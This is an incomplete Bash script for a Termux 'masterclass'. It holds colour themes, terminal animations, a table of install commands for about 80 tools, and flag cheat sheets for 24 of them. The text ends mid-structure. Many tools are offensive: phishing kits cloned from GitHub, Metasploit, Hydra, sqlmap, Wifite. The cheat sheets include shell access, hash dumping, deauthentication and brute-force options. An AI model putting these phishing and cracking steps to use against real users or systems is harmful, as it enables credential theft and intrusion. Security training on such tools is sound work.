#!/data/data/com.termux/files/usr/bin/bash

#=============================================================================
#  TERMUX MASTERCLASS - Interactive Lesson Script
#  File: termux_masterclass.sh
#  Usage: chmod +x termux_masterclass.sh && ./termux_masterclass.sh
#=============================================================================

# Colors for better readability
set_theme_classic() {
    RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
    BLUE='\033[0;34m'; CYAN='\033[0;36m'; MAGENTA='\033[0;35m'
    WHITE='\033[1;37m'; BLACK='\033[0;30m'; NC='\033[0m'; BLINK='\033[5m'
    BG_BLUE='\033[44m'; BG_CYAN='\033[46m'; BG_MAGENTA='\033[45m'; BG_RED='\033[41m'
}
set_theme_cyber() {
    RED='\033[38;5;196m'; GREEN='\033[38;5;46m'; YELLOW='\033[38;5;226m'
    BLUE='\033[38;5;21m'; CYAN='\033[38;5;51m'; MAGENTA='\033[38;5;201m'
    WHITE='\033[38;5;231m'; BLACK='\033[38;5;16m'; NC='\033[0m'; BLINK='\033[5m'
    BG_BLUE='\033[48;5;21m'; BG_CYAN='\033[48;5;51m'; BG_MAGENTA='\033[48;5;201m'; BG_RED='\033[48;5;196m'
}

# New: Matrix theme
set_theme_matrix() {
    RED='\033[38;5;196m'; GREEN='\033[38;5;46m'; YELLOW='\033[38;5;226m'
    BLUE='\033[38;5;27m'; CYAN='\033[38;5;51m'; MAGENTA='\033[38;5;165m'
    WHITE='\033[38;5;15m'; BLACK='\033[38;5;16m'; NC='\033[0m'; BLINK='\033[5m'
    # Matrix theme often uses dark backgrounds with bright green text
    BG_BLUE='\033[48;5;236m'; BG_CYAN='\033[48;5;236m'; BG_MAGENTA='\033[48;5;236m'; BG_RED='\033[48;5;196m'
    # Override some colors for a more consistent Matrix feel
    CYAN='\033[38;5;46m'; BLUE='\033[38;5;46m'; MAGENTA='\033[38;5;46m'; YELLOW='\033[38;5;118m'
}

# New: NeonNight theme
set_theme_neon_night() {
    RED='\033[38;5;197m'; GREEN='\033[38;5;47m'; YELLOW='\033[38;5;201m'
    BLUE='\033[38;5;27m'; CYAN='\033[38;5;201m'; MAGENTA='\033[38;5;201m'
    WHITE='\033[38;5;231m'; BLACK='\033[38;5;16m'; NC='\033[0m'; BLINK='\033[5m'
    BG_BLUE='\033[48;5;18m'; BG_CYAN='\033[48;5;18m'; BG_MAGENTA='\033[48;5;18m'; BG_RED='\033[48;5;197m'
}

set_theme_classic # Default

# --- Animation Helpers ---
typewriter() {
    local text="$1"
    local delay="${2:-0.02}"
    for (( i=0; i<${#text}; i++ )); do
        echo -ne "${text:$i:1}"
        sleep "$delay"
    done
    echo ""
}

loading_anim() {
    local duration=${1:-2}
    local frames=("⠋" "⠙" "⠹" "⠸" "⠼" "⠴" "⠦" "⠧" "⠇" "⠏")
    local end=$((SECONDS + duration))
    while [ $SECONDS -lt $end ]; do
        for f in "${frames[@]}"; do
            echo -ne "\r  ${CYAN}$f${NC} Initializing... "
            sleep 0.05
        done
    done
    echo -e "\r  ${GREEN}✔${NC} System Ready.          "
}

matrix_rain() {
    local duration=${1:-5}
    local end=$((SECONDS + duration))
    local rows=$(tput lines)
    local cols=$(tput cols)
    
    tput civis # Hide cursor
    clear
    while [ $SECONDS -lt $end ]; do
        # Generate random green characters across the screen
        for i in {1..25}; do
            tput cup $((RANDOM % rows)) $((RANDOM % cols))
            # Use Matrix green (color 46) and random ASCII characters
            printf "\e[38;5;46m%c\e[0m" $((RANDOM % 94 + 33))
        done
        # Periodic white character for "glimmer" head effect
        tput cup $((RANDOM % rows)) $((RANDOM % cols))
        printf "\e[38;5;231m%c\e[0m" $((RANDOM % 94 + 33))
        sleep 0.03
    done
    tput cnorm # Restore cursor
    clear
}

# Define tools to check and their installation commands
declare -A TOOLS_TO_CHECK=(
    ["Nmap"]="pkg list-installed | grep -q nmap;pkg install nmap -y;Network discovery and security auditing"
    ["Metasploit"]="pkg list-installed | grep -q metasploit;pkg install unstable-repo -y && pkg install metasploit -y;Advanced penetration testing framework"
    ["Hydra"]="pkg list-installed | grep -q hydra;pkg install hydra -y;Parallelized network login cracker (brute-force)"
    ["Sqlmap"]="pip show sqlmap > /dev/null 2>&1;pip install sqlmap;Automatic SQL injection and database takeover tool"
    ["Aircrack-ng"]="pkg list-installed | grep -q aircrack-ng;pkg install aircrack-ng -y;WiFi network security auditing suite"
    ["John the Ripper"]="pkg list-installed | grep -q john;pkg install john -y;Password security auditing and hash cracking"
    ["Nikto"]="pkg list-installed | grep -q nikto;pkg install nikto -y;Web server vulnerability and misconfiguration scanner"
    ["Wifite"]="pkg list-installed | grep -q wifite;pkg install wifite -y;Automated wireless attack tool"
    ["Termux API"]="pkg list-installed | grep -q termux-api;pkg install termux-api -y;Command-line access to Android system features"
    ["Fish Shell"]="pkg list-installed | grep -q fish;pkg install fish -y;Smart and user-friendly interactive shell"
    ["Htop"]="pkg list-installed | grep -q htop;pkg install htop -y;Interactive system-monitor and process-viewer"
    ["FFmpeg"]="pkg list-installed | grep -q ffmpeg;pkg install ffmpeg -y;Complete solution to record and convert audio/video"
    ["Micro Editor"]="pkg list-installed | grep -q micro;pkg install micro -y;Modern and intuitive terminal-based text editor"
    ["Zsh Shell"]="pkg list-installed | grep -q zsh;pkg install zsh -y;Powerful shell with advanced plugin and theme support"
    ["Neofetch"]="pkg list-installed | grep -q neofetch;pkg install neofetch -y;System information tool with aesthetic ASCII output"
    ["Bat"]="pkg list-installed | grep -q bat;pkg install bat -y;A cat clone with syntax highlighting"
    ["Eza"]="pkg list-installed | grep -q eza;pkg install eza -y;Modern replacement for ls"
    ["Tldr"]="pkg list-installed | grep -q tldr;pkg install tldr -y;Simplified community man pages"
    ["Dust"]="pkg list-installed | grep -q dust;pkg install dust -y;Intuitive disk usage tool"
    ["Aria2"]="pkg list-installed | grep -q aria2;pkg install aria2 -y;Multi-protocol download utility"
    ["Rclone"]="pkg list-installed | grep -q rclone;pkg install rclone -y;Cloud storage sync tool"
    ["LazyGit"]="pkg list-installed | grep -q lazygit;pkg install lazygit -y;TUI for git commands"
    ["Ranger"]="pkg list-installed | grep -q ranger;pkg install ranger -y;Console file manager with VI keybinds"
    ["Caddy"]="pkg list-installed | grep -q caddy;pkg install caddy -y;Automatic HTTPS web server"
    ["Gitea"]="pkg list-installed | grep -q gitea;pkg install gitea -y;Self-hosted Git service"
    ["Amass"]="pkg list-installed | grep -q amass;pkg install amass -y;Attack surface mapping & subdomain enumeration"
    ["Gobuster"]="pkg list-installed | grep -q gobuster;pkg install gobuster -y;URI and DNS subdomain brute-forcer"
    ["Masscan"]="pkg list-installed | grep -q masscan;pkg install masscan -y;The fastest Internet port scanner"
    ["Hping3"]="pkg list-installed | grep -q hping3;pkg install hping3 -y;Advanced TCP/IP packet assembler/analyzer"
    ["Medusa"]="pkg list-installed | grep -q medusa;pkg install medusa -y;Speedy, parallel network login cracker"
    ["CeWL"]="pkg list-installed | grep -q cewl;pkg install cewl -y;Custom wordlist generator from web crawling"
    ["APKTool"]="pkg list-installed | grep -q apktool;pkg install apktool -y;Reverse engineering Android APK files"
    ["Frida"]="pip show frida-tools > /dev/null 2>&1;pip install frida-tools;Dynamic instrumentation toolkit"
    ["ZPhisher"]="[ -d ~/zphisher ] && echo true;git clone --depth 1 https://github.com/htr-tech/zphisher ~/zphisher;Automated phishing framework"
    ["SET"]="[ -d ~/set ] && echo true;git clone --depth 1 https://github.com/trustedsec/social-engineer-toolkit ~/set;The Social-Engineer Toolkit"
    ["Volatility"]="pip show volatility3 > /dev/null 2>&1;pip install volatility3;Advanced memory forensics framework"
    ["Ghidra"]="pkg list-installed | grep -q ghidra;pkg install ghidra -y;NSA software reverse engineering suite"
    ["ExifTool"]="pkg list-installed | grep -q exiftool;pkg install exiftool -y;Read/write meta information in files"
    ["Radare2"]="pkg list-installed | grep -q radare2;pkg install radare2 -y;Advanced reverse engineering framework"
    ["Binwalk"]="pkg list-installed | grep -q binwalk;pkg install binwalk -y;Search binary images for embedded files" 
    ["ATSCAN"]="[ -d ~/ATSCAN ] && echo true;git clone --depth 1 https://github.com/AlisamTechnology/ATSCAN.git ~/ATSCAN;Dork search & exploit scanner"
    ["bing-ip2hosts"]="[ -d ~/bing-ip2hosts ] && echo true;git clone --depth 1 https://github.com/bing-ip2hosts/bing-ip2hosts.git ~/bing-ip2hosts;Discover sites by IP"
    ["CloudEnum"]="pip show cloudenum > /dev/null 2>&1;pip install cloudenum;Multi-cloud resource enumeration"
    ["CMSeeK"]="[ -d ~/CMSeeK ] && echo true;git clone --depth 1 https://github.com/T-Rex-2000/CMSeeK.git ~/CMSeeK;CMS detection & exploitation"
    ["CMSmap"]="[ -d ~/CMSmap ] && echo true;git clone --depth 1 https://github.com/CMSmap/CMSmap.git ~/CMSmap;Automated CMS flaw detection"
    ["Crips"]="[ -d ~/Crips ] && echo true;git clone --depth 1 https://github.com/Manisso/Crips.git ~/Crips;IP/DNS info tool"
    ["dmitry"]="pkg list-installed | grep -q dmitry;pkg install dmitry -y;Deepmagic info gathering"
    ["dnsrecon"]="pip show dnsrecon > /dev/null 2>&1;pip install dnsrecon;DNS enumeration"
    ["Wapiti"]="pkg list-installed | grep -q wapiti;pkg install wapiti -y;Web vulnerability scanner"
    ["Dirb"]="pkg list-installed | grep -q dirb;pkg install dirb -y;Directory brute-forcer"
    ["Fimap"]="[ -d ~/fimap ] && echo true;git clone --depth 1 https://github.com/fimap/fimap.git ~/fimap;LFI/RFI scanner"
    ["Commix"]="[ -d ~/commix ] && echo true;git clone --depth 1 https://github.com/commixproject/commix.git ~/commix;Command injection exploiter"
    ["Zmap"]="pkg list-installed | grep -q zmap;pkg install zmap -y;Internet-wide scanner"
    ["Ettercap"]="pkg list-installed | grep -q ettercap;pkg install ettercap -y;MITM attacks"
    ["fping"]="pkg list-installed | grep -q fping;pkg install fping -y;IP range scanner (replacement for IPscan)"
    ["ARPscan"]="pkg list-installed | grep -q arp-scan;pkg install arp-scan -y;ARP discovery"
    ["RainbowCrack"]="pkg list-installed | grep -q rainbowcrack;pkg install rainbowcrack -y;Rainbow table attacks"
    ["THC-pptp-bruter"]="pkg list-installed | grep -q thc-pptp-bruter;pkg install thc-pptp-bruter -y;PPTP brute-forcer"
    ["Patator"]="[ -d ~/Patator ] && echo true;git clone --depth 1 https://github.com/Patator/Patator.git ~/Patator;Multi-purpose brute-forcer"
    ["Brutespray"]="pip show brutespray > /dev/null 2>&1;pip install brutespray;Automated brute-forcing"
    ["AndroRAT"]="echo true;echo 'AndroRAT requires complex setup (Java/Gradle for server, APK for client).';Android remote access" # Conceptual
    ["Drozer"]="pip show drozer > /dev/null 2>&1;pip install drozer;Android security testing (requires server on device)" # Conceptual
    ["MobSF"]="echo true;echo 'MobSF requires Docker or complex manual setup.';Mobile security framework" # Conceptual
    ["Qark"]="pip show qark > /dev/null 2>&1;pip install qark;Android app vulnerability scanner"
    ["Objection"]="pip show objection > /dev/null 2>&1;pip install objection;Runtime mobile exploration (uses Frida)"
    ["jadx"]="pkg list-installed | grep -q jadx;pkg install jadx -y;APK decompiler"
    ["APKInspector"]="echo true;echo 'APKInspector requires Java and complex setup.';APK analysis" # Conceptual
    ["SocialFish"]="[ -d ~/SocialFish ] && echo true;git clone --depth 1 https://github.com/UndeadSec/SocialFish.git ~/SocialFish;Phishing toolkit"
    ["Evilginx2"]="echo true;echo 'Evilginx2 requires Go and complex setup.';Phishing proxy" # Conceptual
    ["KingPhisher"]="echo true;echo 'KingPhisher requires server/client setup.';Phishing campaigns" # Conceptual
    ["HiddenEye"]="[ -d ~/HiddenEye ] && echo true;git clone --depth 1 https://github.com/DarkSecDevelopers/HiddenEye.git ~/HiddenEye;Phishing framework"
    ["BlackEye"]="[ -d ~/BlackEye ] && echo true;git clone --depth 1 https://github.com/An0nUD4Y/blackeye.git ~/BlackEye;Phishing pages generator"
    ["ShellPhish"]="[ -d ~/ShellPhish ] && echo true;git clone --depth 1 https://github.com/thelinuxchoice/shellphish.git ~/ShellPhish;Phishing toolkit"
    ["Weeman"]="[ -d ~/weeman ] && echo true;git clone --depth 1 https://github.com/samyk/weeman.git ~/weeman;HTTP phishing server"
    ["Gophish"]="echo true;echo 'Gophish requires downloading a specific binary and setup.';Phishing simulation" # Conceptual
    ["YARA"]="pip show yara-python > /dev/null 2>&1;pip install yara-python;Malware signature matching"
    ["Strings"]="pkg list-installed | grep -q binutils;pkg install binutils -y;Binary text extraction (part of binutils)"
    ["Foremost"]="pkg list-installed | grep -q foremost;pkg install foremost -y;File recovery"
    ["LIEF"]="pip show lief > /dev/null 2>&1;pip install lief;PE/ELF/MachO parser (alternative to PEiD)"
)

# Practice Guides: 20 technical details for every tool
declare -A TOOL_PRACTICE_GUIDES=(
    ["Nmap"]="1. -sS: TCP SYN Scan (Stealth)|2. -sV: Service version detection|3. -O: OS fingerprinting|4. -p-: Scan all 65535 ports|5. -T4: Faster execution timing|6. -Pn: Skip host discovery (No Ping)|7. -A: Aggressive scan (OS, Ver, Scripts)|8. --script vuln: Check for vulnerabilities|9. -oN: Save output in normal format|10. -iL: Load targets from a file|11. -sU: UDP Port Scanning|12. --top-ports: Scan most common ports|13. -f: Fragment packets to bypass firewalls|14. --traceroute: Trace hop path to host|15. -v: Increase verbosity level|16. -p 80,443: Scan specific ports|17. -sC: Run default nmap scripts|18. --reason: Show why a port is open/closed|19. --open: Only show open ports|20. -6: Enable IPv6 scanning|21. -sA: ACK scan for firewalls|22. --packet-trace: Show all sent packets"
    ["Metasploit"]="1. msfconsole: Start the main interface|2. search <name>: Find exploits/modules|3. use <path>: Select a specific module|4. show options: View required settings|5. set RHOSTS: Set target IP address|6. set LHOST: Set your listener IP|7. exploit: Execute the selected module|8. sessions -l: List active connections|9. sessions -i <id>: Interact with a session|10. msfvenom: Generate custom payloads|11. check: Verify if target is vulnerable|12. back: Unselect the current module|13. info: Show detailed module information|14. getuid: Get user ID (Meterpreter)|15. sysinfo: Get target system details|16. upload: Send files to target|17. download: Retrieve files from target|18. shell: Drop into a system command shell|19. hashdump: Dump user password hashes|20. db_nmap: Run Nmap and save to database|21. loadpath: Load custom modules|22. resource: Run MSF scripts"
    ["Hydra"]="1. -l <user>: Single username|2. -L <file>: List of usernames|3. -p <pass>: Single password|4. -P <file>: List of passwords|5. -t <tasks>: Set parallel connections|6. -s <port>: Specify custom port|7. -vV: Show login/pass for each attempt|8. -f: Exit after first found login|9. -M <file>: List of targets to attack|10. ssh://: Target SSH protocol|11. ftp://: Target FTP protocol|12. http-get: Target HTTP basic auth|13. mysql://: Target MySQL databases|14. -o <file>: Save found passwords|15. -S: Use SSL for connection|16. -w <time>: Set response timeout|17. -c <time>: Set wait time between login|18. rdp://: Target Remote Desktop|19. smb://: Target Windows SMB|20. telnet://: Target Telnet services|21. -x 3:8:a: Pattern generator|22. -U: Check service availability"
    ["Sqlmap"]="1. -u <url>: Specify target URL|2. --dbs: Enumerate databases|3. --tables: Enumerate tables|4. --columns: Enumerate columns|5. --dump: Extract table entries|6. -D <db>: Select specific database|7. -T <table>: Select specific table|8. -C <col>: Select specific column|9. --batch: Never ask for user input|10. --random-agent: Use random User-Agent|11. --level 5: Max depth of testing|12. --risk 3: Max risk of testing|13. --os-shell: Attempt to get system shell|14. --proxy: Use a proxy server|15. --threads: Set concurrent HTTP requests|16. --tamper: Use scripts to bypass WAF|17. --banner: Retrieve DB banner info|18. --current-user: Identify DB user|19. --passwords: Enumerate password hashes|20. --forms: Scan for forms on the URL|21. --flush-session: Clear target cache|22. --wizard: Interactive setup"
    ["Aircrack-ng"]="1. airmon-ng start <int>: Monitor mode|2. airodump-ng: Packet capturing|3. aireplay-ng: Packet injection tool|4. -w <file>: Specify wordlist file|5. -b <bssid>: Filter by target MAC|6. airmon-ng check kill: Stop interfering|7. --deauth: Disconnect wireless clients|8. -a 2: WPA/WPA2 cracking mode|9. -e <essid>: Filter by Network Name|10. packetforge-ng: Create forged packets|11. airbase-ng: Create fake Access Points|12. ivstools: Merge/convert IV files|13. -j: Output to Hashcat format|14. -p <cpu>: Specify number of CPU cores|15. airdecap-ng: Decrypt captured files|16. airserv-ng: Remote wireless card server|17. -r <file>: Read from capture file|18. --gpsd: Use GPS for mapping|19. -K: Run FMS/KoreK attack (WEP)|20. -M: Run PTW attack (WEP)|21. airodump-ng-oui-update: Update OUI|22. -H: Force 802.11n/ac mode"
    ["John the Ripper"]="1. --wordlist=: Set the dictionary|2. --format=: Specify hash algorithm|3. --show: View cracked passwords|4. --list=formats: View supported hashes|5. --rules: Enable word mutation rules|6. --incremental: Use brute force mode|7. --single: Use 'Single Crack' mode|8. --make-charset: Create custom charset|9. --stdout: Print candidate passwords|10. ssh2john: Convert SSH keys to John|11. zip2john: Convert ZIP files to John|12. rar2john: Convert RAR files to John|13. pdf2john: Convert PDF files to John|14. --mask=: Use specific pattern mask|15. --session=: Save/Resume cracking|16. --status: Check current progress|17. --fork=: Use multiple CPU processes|18. --external: Use custom scripts|19. --salts=: Filter by salt count|20. --user=: Attack specific username|21. --list=external: Show scripts|22. --list=subformats: View variants"
    ["Nikto"]="1. -h <host>: Specify target host|2. -p <port>: Specify target port|3. -ssl: Force SSL mode|4. -C <id>: Check for specific vulnerabilities|5. -Tuning: Filter types of tests|6. -output <file>: Save report|7. -Format <type>: Report style (csv/html)|8. -evasion: Use techniques to hide scan|9. -list-plugins: See available checks|10. -update: Update plugin database|11. -dbcheck: Verify database integrity|12. -useproxy: Connect via proxy|13. -maxtime: Set max scanning duration|14. -Display: Control output detail|15. -config: Use custom config file|16. -mutate: Guess additional filenames|17. -id: Provide basic auth credentials|18. -root: Prepend string to all requests|19. -v: Verbose mode|20. -dbcheck: Check for syntax errors|21. -Save <dir>: Save all output|22. -plugin <name>: Run single check"
    ["Wifite"]="1. --kill: Kill conflicting processes|2. --dict: Specify WPA dictionary|3. --pixie: Use Pixie-Dust WPS attack|4. --bully: Use Bully for WPS|5. --reaver: Use Reaver for WPS|6. --wps: Only target WPS networks|7. --wpa: Only target WPA networks|8. --wep: Only target WEP networks|9. --pmkid: Use PMKID capture attack|10. --clients: Only scan if clients present|11. --power <db>: Filter by signal strength|12. --all: Target all available networks|13. --random-mac: Use spoofed MAC address|14. --no-deauth: Do not disconnect users|15. --stop: Stop after one success|16. -i <int>: Specify wireless interface|17. --crack: Crack captured handshakes|18. --pillage: Auto-extract data from AP|19. --infinite: Attack forever|20. --nodeauth: Disable deauthentication|21. --no-wps: Ignore WPS APs|22. --daemon: Background mode"
    ["Termux API"]="1. termux-battery-status: Power info|2. termux-camera-photo: Capture image|3. termux-clipboard-get: Read clipboard|4. termux-clipboard-set: Write clipboard|5. termux-contact-list: View contacts|6. termux-dialog: Create pop-up inputs|7. termux-location: Get GPS coordinates|8. termux-media-player: Play music|9. termux-microphone-record: Audio capture|10. termux-notification: Show system alert|11. termux-sensor: Read hardware sensors|12. termux-share: Send files to other apps|13. termux-sms-list: Read SMS messages|14. termux-sms-send: Send SMS messages|15. termux-storage-get: Access Android files|16. termux-telephony-call: Dial numbers|17. termux-toast: Temporary pop-up|18. termux-tts-speak: Text-to-speech|19. termux-vibrate: Pulse vibrator|20. termux-wifi-scaninfo: Local WiFi list|21. termux-fingerprint: Bio-auth check|22. termux-torch: Toggle flash"
    ["Fish Shell"]="1. fish_config: Web-based settings|2. autosuggestions: Smart command prediction|3. syntax highlighting: Colorized code|4. abbr: Create powerful abbreviations|5. universal variables: Global settings|6. math: Built-in calculator|7. funced: Edit functions on the fly|8. funcsave: Save functions to disk|9. help: Instant browser-based help|10. set -U: Set persistent variable|11. wildcards: Recursive file matching (**)|12. piping: Stream stderr and stdout|13. history: Fuzzy history searching|14. completions: Context-aware Tab actions|15. themes: Customizable prompt colors|16. fish_vi_key_bindings: Enable Vim mode|17. alt+.: Insert last argument|18. ctrl+f: Accept suggestion|19. fish_indent: Format shell scripts|20. typeset: View defined variables|21. fish_update_completions: Update tips|22. set -x: Export variable"
    ["Htop"]="1. F1: Help menu|2. F2: Setup and configuration|3. F3: Search for process|4. F4: Filter processes by name|5. F5: Tree view of parents/children|6. F6: Sort by column (CPU, MEM, etc)|7. F7: Increase priority (Nice value)|8. F8: Decrease priority (Nice value)|9. F9: Kill selected process|10. F10: Exit program|11. u: Filter by specific user|12. H: Toggle display of threads|13. M: Sort by memory usage|14. P: Sort by CPU usage|15. T: Sort by time active|16. Space: Tag/Select multiple processes|17. U: Untag all processes|18. l: Open files used by process (lsof)|19. s: Trace system calls (strace)|20. c: Tag current process and its children|21. a: Set CPU affinity|22. K: Show/Hide kernel threads"
    ["FFmpeg"]="1. -i <file>: Specify input file|2. -codec:a: Set audio codec|3. -codec:v: Set video codec|4. -b:v: Set video bitrate|5. -r: Set frame rate|6. -s: Set resolution|7. -aspect: Set aspect ratio|8. -vn: Disable video|9. -an: Disable audio|10. -ss: Start time seek|11. -t: Duration of output|12. -f: Force output format|13. -ar: Set audio sample rate|14. -ac: Set audio channels|15. -vf: Apply video filters|16. -af: Apply audio filters|17. -metadata: Set file tags|18. -loop: Loop input stream|19. -shortest: Finish at shortest|20. -preset: Compression speed|21. -loop 1: Loop image for video|22. -map: Select specific streams"
    ["Micro Editor"]="1. Ctrl-S: Save current file|2. Ctrl-Q: Quit editor|3. Ctrl-C: Copy selected text|4. Ctrl-V: Paste from clipboard|5. Ctrl-X: Cut selected text|6. Ctrl-Z: Undo last action|7. Ctrl-Y: Redo last action|8. Ctrl-F: Find text|9. Ctrl-N: Find next match|10. Ctrl-G: Show help menu|11. Ctrl-E: Command bar (exec commands)|12. Ctrl-K: Delete current line|13. Ctrl-A: Select all text|14. Ctrl-O: Open new file|15. Alt-G: Go to specific line|16. Tab: Auto-indentation|17. Shift-Arrows: Text selection|18. Ctrl-B: Run shell command|19. Ctrl-R: Replace text|20. mouse support: Click and drag enabled|21. Alt-/: Comment line|22. Ctrl-T: Open new tab"
    ["Zsh Shell"]="1. .zshrc: Main config file|2. Oh My Zsh: Popular framework|3. plugins: Community modules|4. themes: Visual prompt skins|5. zsh-autosuggestions: Command hints|6. zsh-syntax-highlighting: Colors|7. cd path: Auto-cd without 'cd'|8. RPROMPT: Right-side prompt|9. PROMPT: Left-side prompt|10. nocorrect: Disable auto-correction|11. autoload: Load function files|12. bindkey: Custom keyboard shortcuts|13. compinit: Initialize completions|14. vcs_info: Show Git status in prompt|15. zparseopts: Parse shell arguments|16. zmodload: Dynamic module loading|17. zcompile: Speed up script loading|18. zstyle: Advanced completion config|19. HISTFILE: Path to history logs|20. SHARE_HISTORY: Sync history between tabs|21. zed <file>: Edit file in Zsh|22. vared <var>: Edit variable content"
    ["Neofetch"]="1. --backend: Set image backend|2. --source: Specify image/file|3. --ascii_distro: Change ASCII logo|4. --colors: Set custom color palette|5. --disable: Hide specific info lines|6. --cpu_temp: Show CPU temperature|7. --gpu_brand: Show GPU manufacturer|8. --mem_unit: Set RAM display format|9. --shell_version: Toggle shell version|10. --uptime_shorthand: Shorten time|11. --os_arch: Show 32/64 bit info|12. --ip_timeout: Set timeout for IP check|13. --underline: Toggle logo underline|14. --bold: Toggle bold text|15. --logo_res: Set image resolution|16. --disk_subtitle: Change disk name|17. --package_managers: Toggle PKG info|18. --kernel_shorthand: Shorten kernel|19. --refresh_rate: Show monitor Hz|20. --print_config: Output current config|21. --scrot <file>: Take screenshot|22. --config none: Run raw mode"
    ["Bat"]="1. -p: Plain mode (no headers)|2. -l <lang>: Force syntax coloring|3. -m: Set line numbering|4. --theme: Change color theme|5. --list-themes: View available themes|6. --paging: Control pager behavior|7. --diff: Show Git changes|8. --italic-text: Enable italics|9. --style: Customize visible components|10. --tabs: Set tab width|11. --wrap: Set word wrapping|12. -n: Show line numbers|13. -A: Show non-printable characters|14. -r: Specify line range to show|15. --map-syntax: Map extensions to lang|16. batpipe: Pipe integration|17. -v: Version information|18. --diagnostic: Debugging info|19. --cache: Rebuild syntax cache|20. batgrep: Search with bat output|21. --terminal-width: Limit width|22. --color=always: Force colors"
    ["Eza"]="1. -l: Long listing format|2. -a: Show hidden files|3. -G: Grid view (default)|4. -T: Tree view of directories|5. -R: Recursive listing|6. -x: Sort horizontally|7. -s: Sort by size/time|8. -r: Reverse sort order|9. --icons: Show filetype icons|10. --git: Show Git status per file|11. --level: Limit tree depth|12. --time-style: Change date format|13. --header: Show table headers|14. --binary: Show binary sizes|15. --links: Show hard-link count|16. --inode: Show file inode numbers|17. --blocks: Show block count|18. --group: Show user group info|19. --octal-permissions: Show 755/644|20. --mount: Show mount points|21. --context: Show security contexts|22. --smart-group: Align columns"
    ["Tldr"]="1. <cmd>: Show simplified manual|2. -u: Update local cache|3. -p: Specify platform (linux/osx)|4. -l: List all available pages|5. -r: Show a random command page|6. --color: Force enable colors|7. --no-color: Disable output colors|8. -m: Markdown output mode|9. --config: Specify config path|10. -v: Version info|11. tldr-lint: Validate pages|12. community-driven: Git-based updates|13. focus on examples: No verbose text|14. offline use: Cache is local|15. multi-language: Supports translations|16. concise: One-page maximum|17. high-level: Focus on 90% use case|18. easy installation: Just one binary|19. light: Very small footprint|20. interactive: Some clients add menus|21. --markdown: Render as markdown|22. --version: App version"
    ["Dust"]="1. -d: Max depth of tree|2. -n: Number of lines to show|3. -p: Show full paths|4. -X: Exclude specific paths|5. -I: Ignore hidden files|6. -c: Use colors in output|7. -f: Show file count per dir|8. -s: Sort by size (default)|9. -r: Reverse sort order|10. -v: Version info|11. -b: No bar chart display|12. -i: Case-insensitive search|13. -t: Filter by file type|14. -z: Ignore files smaller than size|15. -P: No percentage display|16. -m: Use metric units (GB/MB)|17. -H: Use binary units (GiB/MiB)|18. -L: Dereference symbolic links|19. -S: Summarize file sizes|20. TUI: Interactive navigation|21. -s: Show dir size only|22. -w: Override width"
    ["Aria2"]="1. -x: Max connections per server|2. -s: Number of split connections|3. -d: Output directory|4. -o: Specify output filename|5. -i: Load URLs from file|6. --rpc-listen-all: Enable remote control|7. --daemon: Run in background|8. --max-download-limit: Set speed cap|9. --continue: Resume partial downloads|10. --check-integrity: Verify checksums|11. --all-proxy: Set proxy for all|12. --bt-seed-unverified: Seed without check|13. --seed-time: Stop after seeding X mins|14. --metalink-file: Use metalink config|15. --ftp-user: FTP credentials|16. --http-user: HTTP credentials|17. --load-cookies: Use browser cookies|18. --user-agent: Spoof browser ID|19. --header: Add custom HTTP headers|20. aria2.conf: Permanent configuration|21. --on-download-complete: Script|22. --max-overall-upload-limit: Cap"
    ["Rclone"]="1. config: Setup cloud accounts|2. copy {target1} {target2}: Copy T1 to T2|3. sync {target1} {target2}: Mirror T1 to T2|4. mount {target1} {target2}: Map T1 cloud as T2 local folder|5. ls {target1}: List files and sizes|6. lsd {target1}: List directories only|7. lsl {target1}: List files with timestamps|8. mkdir {target1}: Create cloud directory|9. rmdir {target1}: Remove cloud directory|10. delete {target1}: Delete file in cloud|11. purge {target1}: Delete folder and contents|12. size {target1}: Get total size of cloud folder|13. check {target1} {target2}: Verify T2 matches T1|14. move {target1} {target2}: Move T1 to T2|15. crypt: Encrypt cloud storage|16. rcat {target1}: Pipe stdin to cloud file|17. serve http {target1}: Serve T1 via http|18. tree {target1}: View T1 as tree structure|19. about {target1}: View account usage/quota|20. link {target1}: Generate public share link|21. check --one-way {target1} {target2}: Compare 1-dir|22. touch {target1}: Cloud timestamping"
    ["LazyGit"]="1. ?: Open help menu|2. space: Stage/Unstage file|3. c: Commit changes|4. p: Push to remote|5. P: Pull from remote|6. b: Open branches menu|7. f: Fetch from remote|8. r: Refresh repository status|9. s: Show status/diff|10. e: Edit file in terminal|11. d: Delete/Discard changes|12. t: Stash/Unstash changes|13. m: Merge current branch|14. M: Switch branches|15. w: Open worktree menu|16. x: Custom command menu|17. Enter: View file commits|18. ESC: Back/Cancel action|19. hjkl: Navigation (Vim keys)|20. config: YAML-based customization|21. A: Add all files|22. o: Open file handler"
    ["Ranger"]="1. i: View file info|2. E: Edit file|3. zh: Toggle hidden files|4. yy: Copy (yank) file|5. pp: Paste file|6. dd: Cut file|7. gh: Go home|8. /: Search for file|9. n: Next search match|10. f: Find file by first char|11. m: Mark file (bookmark)|12. ': Go to bookmark|13. !: Run shell command|14. s: Open shell in folder|15. r: Open with... menu|16. du: Show folder sizes|17. q: Quit Ranger|18. w: Open log/task menu|19. console: Open command bar|20. rifle.conf: File association config|21. :flat <n>: Flatten structure|22. :bulkrename: Multi-rename"
    ["Caddy"]="1. caddy run: Start server|2. caddy start: Start in background|3. caddy stop: Stop background server|4. caddy reload: Apply config changes|5. Caddyfile: Main configuration file|6. reverse_proxy: Direct traffic to port|7. root * <path>: Set site root|8. file_server: Serve static files|9. encode gzip: Enable compression|10. handle_errors: Custom error pages|11. tls <email>: Auto SSL setup|12. log: Enable access logging|13. rewrite: Modify request paths|14. redir: Redirect URLs|15. basicauth: Protect site with pass|16. caddy fmt: Format Caddyfile|17. caddy validate: Check config syntax|18. caddy adapt: Convert to JSON|19. browse: Enable directory listing|20. header: Add custom HTTP headers|21. caddy list-modules: View plugins|22. caddy environ: Show system env"
    ["Gitea"]="1. gitea web: Start web service|2. app.ini: Core configuration file|3. custom/folder: Override UI/themes|4. gitea admin user create: CLI admin|5. gitea cert: Generate self-signed SSL|6. gitea dump: Backup all data|7. SQLite/MySQL: Supported DBs|8. Mirroring: Sync external repos|9. Webhooks: Trigger external tasks|10. Actions: Built-in CI/CD|11. LFS: Support large files|12. SSH Port: Custom Git SSH port|13. API: Full REST API support|14. Issues: Built-in bug tracker|15. Kanban: Project boards|16. Wiki: Repository documentation|17. Pull Requests: Code review|18. Organization: Multi-user groups|19. LDAP: External authentication|20. Docker: Easy container deployment|21. gitea admin auth list: View auth|22. gitea admin regenerate: Fix SSH"
